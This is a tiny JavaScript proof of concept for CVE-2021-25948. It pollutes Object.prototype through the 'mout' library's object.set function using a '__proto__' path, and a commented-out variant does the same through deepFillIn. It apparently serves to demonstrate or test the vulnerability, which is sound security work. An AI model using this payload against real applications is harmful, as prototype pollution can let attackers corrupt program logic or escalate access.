//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
var mout = require("mout");

mout.object.set({}, "__proto__.polluted", "yes");

// var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
// mout.object.deepFillIn({}, payload)
